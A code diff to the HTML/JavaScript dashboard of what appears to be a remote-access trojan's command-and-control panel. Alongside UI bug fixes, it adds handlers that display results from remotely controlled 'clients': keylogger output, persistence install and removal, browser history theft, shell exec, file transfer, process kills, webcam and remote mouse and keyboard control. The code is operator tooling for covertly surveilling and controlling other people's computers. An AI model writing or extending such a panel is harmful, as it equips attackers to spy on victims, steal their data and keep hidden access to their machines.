@@ -69,7 +69,7 @@
       background: rgba(17, 24, 39, 0.9);
       font-family: 'Monaco', 'Menlo', monospace;
       display: flex;
-      flex-direction: column-reverse; /* This is the magic line */
+      flex-direction: column;
     }
     
     .suggestion-item {
@@ -214,7 +214,7 @@
                    class="command-input w-full px-4 py-3 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500">
             
             <!-- Command Suggestions -->
-            <div id="command-suggestions" class="absolute bottom-full left-0 right-0 bg-gray-800 border border-gray-600 rounded-lg mb-1 max-h-64 overflow-y-auto z-10 hidden">
+            <div id="command-suggestions" class="absolute top-full left-0 right-0 bg-gray-800 border border-gray-600 rounded-lg mt-1 max-h-64 overflow-y-auto z-10 hidden">
               <!-- Suggestions will be populated by JavaScript -->
             </div>
           </div>
@@ -272,7 +272,7 @@
             </button>
           </div>
           
-          <div id="output-area" class="output-area flex-1 p-4 rounded-lg overflow-y-auto scrollbar-thin text-sm leading-relaxed">
+          <div id="output-area" class="output-area flex-1 p-4 rounded-lg overflow-y-auto scrollbar-thin text-sm leading-relaxed bg-gray-900">
             <div class="text-gray-400 text-center py-5">
               <i class="fas fa-terminal text-3xl mb-3"></i>
               <p>Ready for commands...</p>
@@ -400,7 +400,6 @@
 
     const COMMANDS = [
         { cmd: '/help', desc: 'Shows this help message.' },
-        { cmd: '/exec <command>', desc: 'Executes a shell command.' },
         { cmd: '/screenshot', desc: 'Takes a screenshot.' },
         { cmd: '/download <path>', desc: 'Downloads a file from the client.' },
         { cmd: '/upload', desc: 'Uploads a file to the client.' },
@@ -428,7 +427,7 @@
 
     // --- DOM ELEMENT SELECTORS ---
     const $ = (selector) => document.querySelector(selector);
-    const $ = (selector) => document.querySelectorAll(selector);
+    const $$ = (selector) => document.querySelectorAll(selector);
 
     const DOM = {
         mainApp: $('#main-app'),
@@ -479,14 +478,14 @@
             disconnected: { class: 'bg-red-500 text-red-900', html: '<i class="fas fa-exclamation-triangle mr-2"></i>Disconnected' },
             error: { class: 'bg-red-600 text-red-100', html: '<i class="fas fa-times-circle mr-2"></i>Error' }
         };
-        el.classList.add(statuses[status].class);
+        el.classList.add(...statuses[status].class.split(' '));
         el.innerHTML = statuses[status].html;
     }
 
     function logOutput(message, type = 'info') {
         const timestamp = new Date().toLocaleTimeString();
         const logEntry = document.createElement('div');
-        const colors = { info: 'text-gray-300', success: 'text-green-400', error: 'text-red-400', warning: 'text-yellow-400', command: 'text-blue-400' };
+        const colors = { info: 'text-white', success: 'text-green-400', error: 'text-red-400', warning: 'text-yellow-400', command: 'text-blue-400' };
         logEntry.className = `mt-2 p-2 rounded ${colors[type]}`;
         logEntry.innerHTML = `<span class="text-gray-500 text-xs mr-2">[${timestamp}]</span> ${message}`;
         
@@ -598,6 +597,30 @@
             },
             'webcam_frame': (d) => displayStreamFrame(d.data, DOM.webcamCanvas, DOM.webcamContainer, DOM.webcamStatus),
             'file_download': (d) => downloadFile(d.filename, d.data),
+            'network_scan': (d) => logOutput(`Network Scan: ${d.output}`, 'info'),
+            'ls': (d) => logOutput(`Directory Listing: <pre class="whitespace-pre-wrap">${d.output}</pre>`, 'info'),
+            'webcam_start': (d) => logOutput(`Webcam: ${d.output}`, 'info'),
+            'webcam_stop': (d) => logOutput(`Webcam: ${d.output}`, 'info'),
+            'systeminfo': (d) => logOutput(`System Info: <pre class="whitespace-pre-wrap">${d.output}</pre>`, 'info'),
+            'info': (d) => logOutput(`Client Info: <pre class="whitespace-pre-wrap">${JSON.stringify(d.data, null, 2)}</pre>`, 'info'),
+            'network_info': (d) => logOutput(`Network Info: <pre class="whitespace-pre-wrap">${d.output}</pre>`, 'info'),
+            'history': (d) => logOutput(`Browser History: <pre class="whitespace-pre-wrap">${d.output}</pre>`, 'info'),
+            'ps': (d) => logOutput(`Process List: <pre class="whitespace-pre-wrap">${d.output}</pre>`, 'info'),
+            'webcam_list': (d) => logOutput(`Webcam List: <pre class="whitespace-pre-wrap">${d.output}</pre>`, 'info'),
+            'exec': (d) => logOutput(`Exec: <pre class="whitespace-pre-wrap">${d.output || d.type}</pre>`, 'info'),
+            'upload': (d) => logOutput(`Upload: <pre class="whitespace-pre-wrap">${d.output || d.type}</pre>`, 'info'),
+            'cd': (d) => logOutput(`Change Directory: <pre class="whitespace-pre-wrap">${d.output || d.type}</pre>`, 'info'),
+            'rm': (d) => logOutput(`Remove: <pre class="whitespace-pre-wrap">${d.output || d.type}</pre>`, 'info'),
+            'mkdir': (d) => logOutput(`Make Directory: <pre class="whitespace-pre-wrap">${d.output || d.type}</pre>`, 'info'),
+            'kill': (d) => logOutput(`Kill Process: <pre class="whitespace-pre-wrap">${d.output || d.type}</pre>`, 'info'),
+            'msgbox': (d) => logOutput(`Message Box: <pre class="whitespace-pre-wrap">${d.output || d.type}</pre>`, 'info'),
+            'persist': (d) => logOutput(`Persistence: <pre class="whitespace-pre-wrap">${d.output || d.type}</pre>`, 'info'),
+            'unpersist': (d) => logOutput(`Unpersistence: <pre class="whitespace-pre-wrap">${d.output || d.type}</pre>`, 'info'),
+            'keylogger': (d) => logOutput(`Keylogger: <pre class="whitespace-pre-wrap">${d.output || d.type}</pre>`, 'info'),
+            'mouse': (d) => logOutput(`Mouse Event: <pre class="whitespace-pre-wrap">${d.output || d.type}</pre>`, 'info'),
+            'keyboard': (d) => logOutput(`Keyboard Event: <pre class="whitespace-pre-wrap">${d.output || d.type}</pre>`, 'info'),
+            'ping': (d) => { /* Ignore ping messages */ },
+            'null': (d) => logOutput(`Server Message: ${d.output}`, 'error'),
             'error': (d) => {
                 logOutput(`Error: ${d.message}`, 'error');
                 showNotification(d.message, 'error');
@@ -659,7 +682,7 @@
     }
 
     function updateClientVisuals() {
-        $('.client-card').forEach(card => {
+        $$('.client-card').forEach(card => {
             const clientId = card.dataset.clientId;
             const checkIcon = card.querySelector('.fa-check-circle');
             if (selectedClients.has(clientId)) {
@@ -811,7 +834,7 @@
     // --- SERVER STATS ---
     async function loadServerStats() {
         DOM.serverStatsLoading.style.display = 'flex';
-        const response = await fetchWithAuth('/stats');
+        const response = await fetchWithAuth('/api/stats');
         DOM.serverStatsLoading.style.display = 'none';
         if (response && response.ok) {
             const stats = await response.json();
@@ -829,11 +852,10 @@
             'Uptime': stats.uptime,
             'Total Clients': stats.total_clients,
             'CPU Usage': `${stats.cpu_usage}%`,
-            'Memory Usage': `${stats.memory_usage.percent}% (${stats.memory_usage.used_mb}MB / ${stats.memory_usage.total_mb}MB)`,
+            'Memory Usage': `${stats.memory_percent}% (${(stats.memory_used_gb * 1024).toFixed(2)}MB / ${(stats.memory_total_gb * 1024).toFixed(2)}MB)`,
             'Python Version': stats.python_version,
             'Server OS': stats.server_os,
-            'Sent Messages': stats.messages.sent,
-            'Received Messages': stats.messages.received
+            
         };
 
         Object.entries(statItems).forEach(([title, value]) => {
@@ -1017,7 +1039,7 @@
             }
         });
 
-        $('.quick-action').forEach(btn => {
+        $$('.quick-action').forEach(btn => {
             btn.addEventListener('click', () => {
                 DOM.commandInput.value = btn.dataset.command + ' ';
                 DOM.commandInput.focus();
@@ -1027,7 +1049,7 @@
 
         $('#refresh-clients').addEventListener('click', requestClientList);
         $('#select-all-clients').addEventListener('click', () => {
-            const allClientIds = Array.from($('.client-card')).map(card => card.dataset.clientId);
+            const allClientIds = Array.from($$('.client-card')).map(card => card.dataset.clientId);
             const allSelected = selectedClients.size === allClientIds.length;
             selectedClients.clear();
             if (!allSelected) allClientIds.forEach(id => selectedClients.add(id));
@@ -1100,7 +1122,5 @@
 
     document.addEventListener('DOMContentLoaded', init);
   </script>
-</body>
-</html>
 </body>
 </html>
